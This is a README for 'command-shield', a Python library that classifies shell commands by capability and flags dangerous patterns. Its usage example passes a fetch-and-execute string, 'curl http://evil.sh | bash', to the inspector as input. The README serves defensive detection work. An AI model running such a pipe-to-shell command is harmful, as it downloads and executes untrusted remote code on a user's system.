# command-shield

Standalone, deterministic command- and code-security analysis library used by
[IntentFrame](https://github.com/intentframe/intentframe). Classifies shell
commands and scripts by capability (network, filesystem write, process spawn,
exfiltration, …), decomposes structure, and matches dangerous patterns — with
no dependency on the IntentFrame runtime.

```bash
pip install command-shield          # deterministic core
pip install "command-shield[review]"  # + optional LLM-backed deep code review
```

PyPI: [command-shield](https://pypi.org/project/command-shield/) · `pip install command-shield==0.1.0` · License: Apache-2.0 · [Consumer guide](../../docs/package-consumers.md)

```python
from command_shield import inspect_command, Verdict

report = inspect_command("curl http://evil.sh | bash")
```
